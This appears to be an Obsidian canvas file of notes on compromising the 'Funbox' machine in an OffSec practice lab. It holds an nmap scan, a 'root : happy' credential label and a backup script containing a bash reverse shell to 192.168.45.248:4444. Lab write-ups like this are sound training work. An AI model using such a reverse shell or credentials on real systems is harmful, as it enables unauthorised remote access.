@@ -1,0 +1,31 @@
+{
+	"nodes":[
+		{"id":"c8a9b6820beb6d07","x":220,"y":-400,"width":290,"height":258,"type":"group","label":"TCP - open"},
+		{"id":"e4cb21af0f8bd1a4","x":-182,"y":-293,"width":250,"height":60,"type":"text","text":"# Target"},
+		{"id":"4a9b7cc2b3d6101b","x":-727,"y":-75,"width":827,"height":515,"type":"text","text":"## nmap\n```\nPORT      STATE SERVICE VERSION\n21/tcp    open  ftp     ProFTPD\n22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d2:f6:53:1b:5a:49:7d:74:8d:44:f5:46:e3:93:29:d3 (RSA)\n|   256 a6:83:6f:1b:9c:da:b4:41:8c:29:f4:ef:33:4b:20:e0 (ECDSA)\n|_  256 a6:5b:80:03:50:19:91:66:b6:c3:98:b8:c4:4f:5c:bd (ED25519)\n80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry \n|_/secret/\n|_http-title: Did not follow redirect to http://funbox.fritz.box/\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n33060/tcp open  mysqlx  MySQL X protocol listener\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```"},
+		{"id":"67dd25a68bf29300","type":"text","text":"port 22","x":240,"y":-297,"width":250,"height":60},
+		{"id":"e7c3cb6a172a8d7b","type":"text","text":"port 33060","x":240,"y":-222,"width":250,"height":60},
+		{"id":"78c6be205382f2e6","x":240,"y":-380,"width":250,"height":60,"type":"text","text":"port 21"},
+		{"id":"b8b49f39da12d372","x":840,"y":-340,"width":903,"height":297,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260801025432.png"},
+		{"id":"bb306b6ac0846034","x":897,"y":183,"width":790,"height":320,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260801025501.png"},
+		{"id":"d520b4381e6a017b","x":946,"y":643,"width":692,"height":280,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260801025639.png"},
+		{"id":"f3a0bbd954bcf222","x":497,"y":-640,"width":400,"height":105,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260801025846.png"},
+		{"id":"79c1cd974d6e24e4","x":2080,"y":202,"width":620,"height":1162,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260801031500.png"},
+		{"id":"edbbcbb716cfe2a7","x":1660,"y":1000,"width":250,"height":120,"type":"text","text":"```\nIT WILL TAKE ALOT OF UR TIME BE THERE AND RE TRY \n```"},
+		{"id":"61abdbf60744ad6c","x":1575,"y":1240,"width":420,"height":180,"type":"text","text":"```\njoe@funbox:/home/funny$ cat ./.backup.sh\n#!/bin/bash\nbash -c 'bash -i >& /dev/tcp/192.168.45.248/4444 0>&1'\njoe@funbox:/home/funny$ \n```"},
+		{"id":"643f346a4f55f6c7","x":1356,"y":1500,"width":857,"height":320,"type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260801031700.png"}
+	],
+	"edges":[
+		{"id":"0d49233034f43e3f","fromNode":"e4cb21af0f8bd1a4","fromSide":"bottom","toNode":"4a9b7cc2b3d6101b","toSide":"top"},
+		{"id":"7616f1e496f15086","fromNode":"e4cb21af0f8bd1a4","fromSide":"right","toNode":"c8a9b6820beb6d07","toSide":"left"},
+		{"id":"5a3b004336dc9dd0","fromNode":"e7c3cb6a172a8d7b","fromSide":"right","toNode":"b8b49f39da12d372","toSide":"left"},
+		{"id":"94c7efe1bd259db3","fromNode":"b8b49f39da12d372","fromSide":"bottom","toNode":"bb306b6ac0846034","toSide":"top","label":"root : happy"},
+		{"id":"9378791062a1d45a","fromNode":"bb306b6ac0846034","fromSide":"bottom","toNode":"d520b4381e6a017b","toSide":"top"},
+		{"id":"8eeb654b29983014","fromNode":"e7c3cb6a172a8d7b","fromSide":"right","toNode":"f3a0bbd954bcf222","toSide":"bottom"},
+		{"id":"73bdcc8b82331777","fromNode":"d520b4381e6a017b","fromSide":"right","toNode":"79c1cd974d6e24e4","toSide":"left"},
+		{"id":"86432761417c5799","fromNode":"d520b4381e6a017b","fromSide":"right","toNode":"edbbcbb716cfe2a7","toSide":"top"},
+		{"id":"c48a13544068b449","fromNode":"edbbcbb716cfe2a7","fromSide":"bottom","toNode":"61abdbf60744ad6c","toSide":"top"},
+		{"id":"f9e1d2d261ec991a","fromNode":"61abdbf60744ad6c","fromSide":"bottom","toNode":"643f346a4f55f6c7","toSide":"top"},
+		{"id":"37fd7f041d8f99ee","fromNode":"643f346a4f55f6c7","fromSide":"right","toNode":"79c1cd974d6e24e4","toSide":"bottom"}
+	]
+}
